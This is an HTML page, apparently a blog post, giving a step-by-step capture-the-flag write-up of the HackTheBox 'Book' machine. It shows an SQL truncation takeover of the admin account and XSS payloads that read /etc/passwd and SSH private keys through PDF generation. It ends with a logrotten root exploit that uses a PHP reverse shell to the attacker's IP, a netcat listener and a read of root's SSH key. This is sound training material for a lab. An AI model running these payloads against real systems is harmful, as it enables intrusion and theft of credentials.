@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <link rel='icon' href='/favicon.ico' type='image/x-icon'/>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - Book Writeup</title>
+<meta property="og:title" content="Hackthebox - Book Writeup" />
+      <meta property="og:description" content="A Medium difficulty linux box" />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="/img/htb_book/card.png" />
+
+</head>
+
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center">
+      <a style="text-align:center"><img class="logo" src="/avatar.png" alt="" width="120" height="120"></a></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-size:1.7em;text-align:center; color:#eee">0xTaylor</b><br/>
+      <p style="text-align:center;"><small><i>Hackthebox Updates</br> And Writeups</i></small></p>
+      <p style="text-align:center;font-size:20px">
+
+    <div>
+      <center><h3><a href="/">HOME</a></h3></center>
+      
+    </div>
+        <center><a href="https://twitter.com/ProjectFeds" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://github.com/0xtaylor" style="display:inline"><i class="fab fa-github"></i></a>
+        <a href="https://discord.gg/pCWTcJ3" style="display:inline"><i class="fab fa-discord"></i></a></center>
+      </p>
+    </div>
+  </br><p><small><i><center>Still in development</center></i></small></p>
+  </div>
+
+<article>
+<h1 id="hackthebox---Book-writeup">Hackthebox - Book Writeup</h1>
+<div class="figure">
+<img src="/img/htb_book/card.png" width="600" height=""/>
+</div>
+
+<div>
+    <h1>Nmap</h1>
+    <p>Let's scan for any open ports!</p>
+    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nmap -sV -sC -T4 -p- 10.10.10.176</span></code></pre></div>
+    <center><img src="/img/htb_book/0.png" alt="" width="600" height=""/></center></a>
+
+    <p>As we can see. Port 22 for SSH is open and Port 80 for an Apache webserver is also open.</p>
+
+    <h1>Finding Directories</h1>
+    <center><img src="/img/htb_book/0.5.png" alt="" width="600" height=""/></center></a>
+    <p>Nothing too important. All are restricted or require a login</p>
+    <p>Let's go to the webserver and see if we can get anything!</p>
+
+    <h1>Our findings</h1>
+
+    <center><img src="/img/htb_book/1.png" alt="" width="600" height=""/></center></a>
+    <p>Once we go to the webpage, we're greeted with a login page. Since we don't have a user account we can create an account
+    and sign in with it</p>
+    <center><img src="/img/htb_book/2.png" alt="" width="600" height=""/></center></a>
+    <p>Once we've logged in, we see this very basic homepage. After looking around quite a bit, I see two things that stand out to me:</p>
+
+    <center><img src="/img/htb_book/3.png" alt="" width="600" height=""/></center></a>
+    <p>This was the first thing that stood out to me within inspecting the pages was a contact page. The email shows admin@book.htb 
+    meaning there is an admin account. We may have to find a way to access it.</p>
+    <br>
+
+    <p>I also notice this piece of code that stood out to me:</p>
+    <div class="sourceCode"><pre class="sourceCode javascript"><code class="sourceCode bash"><span class="ex">
+            if (document.location.search.match(/type=embed/gi)) {
+              window.parent.postMessage("resize", "*");
+            }
+          function validateForm() {
+            var x = document.forms["myForm"]["name"].value;
+            var y = document.forms["myForm"]["email"].value;
+            if (x == "") {
+              alert("Please fill name field. Should not be more than 10 characters");
+              return false;
+            }
+            if (y == "") {
+              alert("Please fill email field. Should not be more than 20 characters");
+              return false;
+            }
+          }
+    </span></code></pre></div>
+
+    <p>This code shows that your name field can't be more than 10 characters and the email can't be more than 20 characters.</p>
+    <br>
+    <p>Now, with this limit we could try and exploit it to change an admin account password using a SQL Truncation Attack. 
+    How this attack works is within the database and how the server parses special characters such as spaces. Let's say 
+    if you register with an email like this:</p>
+
+    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">admin@admin.com                    s</span></code></pre></div>
+
+    <p>If the email space has a limit like ours. What would happen is it would check if any user has registered with 
+    the same email and if nobody has, it's going to cut up the email (since you've passed the character limit) and it's
+    going to delete the spaces (if it's a MySQL Database) and saves the entry. If we put so and so together. We know
+    that we have to get the admin account using a SQL Truncation Attack</p>
+
+    <h1>Getting an admin account</h1>
+    <p>What we need to do is logout of the page. Launch burpsuite since we aren't able to send the details through the normal login. So let's
+    open burpsuite and intercept the request for when you login to 10.10.10.176/index.php</p>
+
+    <p>Once you do that, you should get something like this:</p>
+    <center><img src="/img/htb_book/4.png" alt="" width="600" height=""/></center></a>
+    <p>Now we need to copy this to requests and change the very last bit to something like this:</p>
+    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">name=admin&email=admin@book.htb                    s&password=12345678</span></code></pre></div>
+    <p>Now press Send!</p>
+
+    <center><img src="/img/htb_book/5.png" alt="" width="600" height=""/></center></a>
+    <p>If you get something like. You officially have changed the admin password to whatever you put in password=</p>
+
+    <p>I successfully managed to login with admin creds on /index.php but nothing changed. Then i remember from the dirb
+    scan that there was a /admin directory. Let's go to it and login with our admin creds!</p>
+
+    <center><img src="/img/htb_book/6.png" alt="" width="600" height=""/></center></a>
+
+    <p>Well this is unfortunate. Here's how to fix it:</p>
+    <p>Go to 10.10.10.176/index.php, click signup, set the info to whatever you like but before you press the "SIGN UP"
+    button. Intercept the request with burpsuite. Once you do that, it should look like this:</p>
+
+    <center><img src="/img/htb_book/7.png" alt="" width="600" height=""/></center></a>
+
+    Copy all of that and go to the repeater tab then change the very last line to this:
+
+    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">name=admin&email=admin@book.htb                    s&password=12345678</span></code></pre></div>
+
+    <p>After that, send the request. You should get this response:</p>
+
+    <center><img src="/img/htb_book/8.png" alt="" width="600" height=""/></center></a>
+
+    <p>Once this happens, go to 10.10.10.176/admin and login with the admin email and the password (which is 12345678) </p>
+
+    <center><img src="/img/htb_book/9.png" alt="" width="600" height=""/></center></a>
+
+    <p>It worked!</p>
+
+    <h1>Enumerating with admin creds</h1>
+
+
+    <p>While looking around, I noticed that in Collections has 2 PDF's. One with the registered users and another with the
+    books that were submitted here:</p>
+
+    <center><img src="/img/htb_book/10.png" alt="" width="600" height=""/></center></a>
+
+    <p>I tried submitting a book and downloaded the collection's PDF file.</p>
+
+    <center><img src="/img/htb_book/11.png" alt="" width="600" height=""/></center></a>
+
+    <p>I downloaded it and noticed that my submission was in here. Then i realised that this PDF file was updated whenever 
+    we submit a book. What if we can control the input of it somehow.</p>
+
+    <p>I tried multiple things but then an XSS attack worked for me. Here's how to do it:</p>
+
+    <p>Open a new tab and go to 10.10.10.176/index.php and login. Then go to Collections. Then fill the boxes next to 
+    Book Title and Author with this:</p>
+
+    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">&lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd");x.send();&lt;/script&gt;</span></code></pre></div>
+
+    <p>For the browse section. Add any file you like, that bit doesn't really matter but you must add something.</p>
+
+    <p>After doing all of that, click upload and you should get something like this:</p>
+
+    <center><img src="/img/htb_book/12.png" alt="" width="600" height=""/></center></a>
+
+    <p>After this, go to the admin panel and go to collections. After that, click PDF next to Collections. 
+    It should download a PDF. After that, open the PDF file. You should get something like this:</p>
+
+    <center><img src="/img/htb_book/13.png" alt="" width="600" height=""/></center></a>
+
+    <p>Our XSS attack worked!</p>
+
+    <h1>Getting user</h1>
+
+    <p>We notice a user called reader. After many attempts. I realised that I could try and change the output to give me an
+    ssh key for the reader user. We can do it like this:</p>
+
+    <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">&lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();&lt;/script&gt;</span></code></pre></div>
+
+    <p>Let's try it out and download the pdf!</p>
+
+    <center><img src="/img/htb_book/14.png" alt="" width="600" height=""/></center></a>
+
+    <p>We got it! But there's a problem...</p>
+
+    <p>The key doesn't work for some reason since it doesn't fully output it. Here's how to fix it:</p>
+
+    <p>Download chrome or chromium and then open the pdf file in chrome. After that, select all of it and there you have your 
+    ssh key!</p>
+
+<p>Once you've gotten the ssh key. Login to reader using that key like so:</p>
+
+<center><img src="/img/htb_book/15.png" alt="" width="600" height=""/></center></a>
+
+<p>We're in! We officially have user!</p>
+
+
+<h1>Enumerating with user</h1>
+
+<p>If we launch pspy we see a strange process called logrotate. It also stops every 5 seconds.</p>
+
+<center><img src="/img/htb_book/16.png" alt="" width="600" height=""/></center></a>
+
+<p>After a bit of research, I found an exploit for logrotate <a href="https://github.com/whotwagner/logrotten">here</a></p>
+
+<p>Finding out more about this, I realised that this is an exploit for privilege escalation if a user has write access
+within a log file being used by logrogate. This works since logrogate is being executed as root. Our goal here is to
+get root using logrotten that will execute a reverse shell being picked up by logrogate.</p>
+
+<p>Lets get to work!</p>
+
+<h1>Getting root</h1>
+
+<p>Compile logrotten (gcc logrotten.c -o logrotten) on your machine. Then launch a http webserver:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">sudo python3 -m http.server 80</small></span></code></pre></div>
+
+<p>and on the ssh session go to the backups folder then install logrotten from your webserver:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">wget http://&lt;YOUR IP&gt;/logrotten</small></span></code></pre></div>
+
+<p>Once you've done that, make a file called root in the ssh session and then put this inside the file:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">php -r '$sock=fsockopen("10.10.*.*",4444);exec("/bin/bash -i <&3 >&3 2>&3");'</small></span></code></pre></div>
+
+<p><strong>Make sure to change the ip to your tun0 ip (the ip you use for hackthebox)</strong></p>
+
+<p>Once you've done that. Save the file and mark it as an executable (chmod +x root)</p>
+
+To launch it. You must do this on the ssh session:
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">./logrotten -p ./root /home/reader/backups/access.log</small></span></code></pre></div>
+
+<p>Once you've done this. Load up two more terminals</p>
+
+<p>In the first terminal you should load up a netcat session like this:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nc -lvnp 4444</small></span></code></pre></div>
+
+<p>In the second terminal. SSH into reader and cd into backups. Then do this command:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">echo "test" >> access.log</small></span></code></pre></div>
+
+<p>What these will all do is it will notice a change in access.log and then it will execute whatever logrotten has said to
+which in our case. Is the reverse shell.</p>
+
+<p>You won't get the reverse shell at the start so you need to execute the commands again in both the ssh sessions until
+you get the reverse shell (make sure to do the logrotten command first)</p>
+
+<p>Once you get the shell quickly do this command  to get the ssh key for root as the shell will go away in 5 seconds:</p>
+
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">cat /root/.ssh/id_rsa</small></span></code></pre></div>
+
+<p>If everything is done successfully, you should get something like this:</p>
+
+<center><img src="/img/htb_book/18.png" alt="" width="600" height=""/></center></a>
+
+<p>We got the root ssh key! Let's try it out!</p>
+
+<center><img src="/img/htb_book/19.png" alt="" width="600" height=""/></center></a>
+
+<p><center>We got root! I hope this helped you on your journey to getting root on book!</center></p>
+</article>
+<h1></h1>
+<footer>
+  <center><script src="https://www.hackthebox.eu/badge/260838"></script></br></center>
+</footer>
+</body>
